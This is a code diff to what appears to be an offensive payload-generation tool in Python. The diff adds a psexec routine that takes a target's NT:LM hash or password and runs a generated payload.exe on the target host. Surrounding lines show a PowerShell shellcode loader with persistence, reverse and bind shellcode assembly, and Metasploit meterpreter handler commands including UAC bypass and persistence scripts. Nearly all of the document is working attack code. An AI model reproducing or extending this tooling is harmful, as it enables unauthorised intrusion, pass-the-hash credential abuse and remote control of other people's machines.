@@ -16,6 +16,8 @@ import string
 import re
 import glob
 import readline
+import time
+import psexec
 
 
 t = blessings.Terminal()
@@ -37,6 +39,22 @@ def ServePayload(payloaddirectory):
         httpd.serve_forever()
     except:
         print t.bold_red + '\n[*] WebServer Shutdown' + t.normal
+
+
+def ServePsexec(payloaddirectory,targethash,targetusername,targetdomain,targetipaddr,targetpassword):
+    try:
+        command = ''
+        path = ''
+        exeFile = payloaddirectory
+        copyFile = ''
+        PSEXEC = psexec.PSEXEC(command, path, exeFile, copyFile, protocols = None,username = targetusername,hashes = targethash,domain = targetdomain,password = targetpassword,aesKey = None,doKerberos = False)
+        print t.bold_green + '\n [*] Starting Psexec....' + t.normal
+        time.sleep(20)
+        PSEXEC.run(targetipaddr)
+    except Exception as E:
+        print t.bold_red + '\n[*] Canceled Psexec!'
+        print E
+        print '\n[*] Psexec May Have Worked' + t.normal
 
 
 def PyCipher(filecontents):  # Adaptation of PyHerion 1.0 By: @harmj0y
@@ -239,10 +257,18 @@ try:
         if len(portnum) is 0:
             portnum = 4444
         print t.bold_green + '\n[*] IP SET AS %s\n[*] PORT SET AS %s\n' % (ipaddr, portnum) + t.normal
-        ip1, ip2, ip3, ip4 = ipaddr.split('.')
-        iphex = struct.pack('BBBB', int(ip1), int(ip2), int(ip3), int(ip4))
-        porthex = struct.pack('>h', int(portnum))
-        porthex2 = struct.pack('>h', int(portnum) + 1)
+        try:
+            ip1, ip2, ip3, ip4 = ipaddr.split('.')
+            iphex = struct.pack('BBBB', int(ip1), int(ip2), int(ip3), int(ip4))
+        except:
+            print t.bold_red + '[*] Error in IP Syntax'
+            sys.exit(1)
+        try:
+            porthex = struct.pack('>h', int(portnum))
+            porthex2 = struct.pack('>h', int(portnum) + 1)
+        except:
+            print t.bold_red + '[*] Error in Port Syntax'
+            sys.exit(1)
         shellcode = payloadchoice % (iphex, porthex)
         shellcode2 = payloadchoice % (iphex, porthex2)
     elif menuchoice == '3':
@@ -250,8 +276,12 @@ try:
             '\n[*] Press Enter For Default Bind Port(4444)\n[*] Port> ')
         if len(bindport) is 0:
             bindport = 4444
-        bindporthex = struct.pack('>h', int(bindport))
-        bindporthex2 = struct.pack('>h', int(bindport) + 1)
+        try:
+            bindporthex = struct.pack('>h', int(bindport))
+            bindporthex2 = struct.pack('>h', int(bindport) + 1)
+        except:
+            print t.bold_red + '[*] Error in IP Syntax'
+            sys.exit(1)
         shellcode = payloadchoice % (bindporthex)
         shellcode2 = payloadchoice % (bindporthex2)
 
@@ -292,7 +322,7 @@ try:
             sys.exit()
         else:
             print ez2read_shellcode
-            sys.exit()
+            sys.exit(0)
 
     persistencelayout = re.sub(r'\\x', '0x', newpayloadlayout).rstrip(',')
     persistencesleep = """Start-Sleep -s 60;$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = %s;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));$2 = "-enc ";if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + "\syswow64\WindowsPowerShell\\v1.0\powershell";iex "& $3 $2 $e"}else{;iex "& powershell $2 $e";}""" % (
@@ -387,20 +417,44 @@ ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
                   (payloadinexe_payloadname, payloadinexe_payloadname))
 
     want_to_upload = raw_input(
-        '\n[*] Upload To Local Websever? [y]/n: ')
+        '\n[*] Upload To Local Websever or (p)sexec? [y]/p/n: ')
     if want_to_upload.lower() == 'y' or want_to_upload == '':
-        if want_to_payloadinexe == 'y':
+        if want_to_payloadinexe == 'y' and want_to_upload.lower() == 'y' or want_to_payloadinexe == 'y' and want_to_upload.lower() == '':
             print t.bold_green + "\n[*] Serving Payload On http://%s:8000/%s" % (IP, payloadinexe_payloadname) + t.normal
             a = multiprocessing.Process(
                 target=ServePayload, args=(os.getcwd() + '/compiled',))
             a.daemon = True
             a.start()
-        else:
+        elif want_to_payloadinexe == 'n' and want_to_upload.lower() == 'y' or want_to_payloadinexe == '' and want_to_upload.lower() == '':
             print t.bold_green + "\n[*] Serving Payload On http://%s:8000/payload.exe" % (IP) + t.normal
             a = multiprocessing.Process(
                 target=ServePayload, args=(payloaddir,))
             a.daemon = True
             a.start()
+
+    if want_to_upload.lower() == 'p' or want_to_upload.lower() == 'psexec':
+        while True:
+            targethash = raw_input('[*] Targets NT:LM Hash or Plain Text Password:')
+            targetusername = raw_input('[*] Targets Username:')
+            targetdomain = raw_input('[*] Targets Domain:')
+            targetipaddr = raw_input('[*] Targets Ip Address:')
+            print t.bold_green + 'NT:LM HASH OR PLAIN TEXT PASSWORD = ' + targethash + '\nTARGETS USERNAME = ' + targetusername + '\nTARGETS DOMAIN = ' + targetdomain + '\nTARGETS IP ADDRESS = ' +targetipaddr + t.normal
+            ispsexecdetailscorrect = raw_input('[*] Are These Details Correct? ([y]/n)')
+            if ispsexecdetailscorrect == 'y' or ispsexecdetailscorrect == '':
+                if re.search(':',targethash):
+                    print t.bold_green + '[*] NT:LM HASH DETECTED' + t.normal
+                    targetpassword = ''
+                else:
+                    print t.bold_green + '[*] CLEAR TEXT PASSWORD DETECTED' + t.normal
+                    targetpassword = targethash
+                    targethash = None
+                break
+            else:
+                continue
+        b = multiprocessing.Process(
+            target=ServePsexec, args=(payloaddir + '/payload.exe',targethash,targetusername,targetdomain,targetipaddr,targetpassword))
+        b.daemon = True
+        b.start()
 
     if menuchoice == '1':
         os.system('nc -lvp %s' % portnum)
@@ -410,14 +464,14 @@ ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
         elif want_ALLCHECKS.lower() == 'y':
             os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LPORT %s;set LHOST 0.0.0.0;set autorunscript post/windows/manage/exec_powershell SCRIPT=allchecks.ps1;set ExitOnSession false;exploit -j\'' % portnum)
         else:
-            os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LPORT %s;set LHOST 0.0.0.0;set autorunscript post/windows/manage/smart_migrate;set ExitOnSession false;exploit -j\'' % portnum)
+            os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LPORT %s;set LHOST 0.0.0.0;set ExitOnSession false;exploit -j\'' % portnum)
     elif menuchoice == '3':
         bindip = raw_input(
             '\n[*] Enter Target Ip Address For Metasploit To Connect To The Bind Shell\n[*] IP> ')
         if want_UACBYPASS.lower() == 'y':
             os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/bind_tcp;set LPORT %s;set RHOST %s;set autorunscript multi_console_command -rc uacbypass.rc;set ExitOnSession false;exploit -j;set LPORT %s;set autorunscript multi_console_command -rc uacbypass2.rc;exploit -j\'' % (bindport, bindip, bindport + 1))
         else:
-            os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/bind_tcp;set LPORT %s;set RHOST %s;set autorunscript post/windows/manage/smart_migrate;set ExitOnSession false;exploit -j \'' % (bindport, bindip))
+            os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/bind_tcp;set LPORT %s;set RHOST %s;set ExitOnSession false;exploit -j \'' % (bindport, bindip))
     elif menuchoice == '5':
         os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LPORT %s;set LHOST 0.0.0.0;set autorunscript multi_console_command -rc persist.rc;set ExitOnSession false;exploit -j\'' % portnum)
 
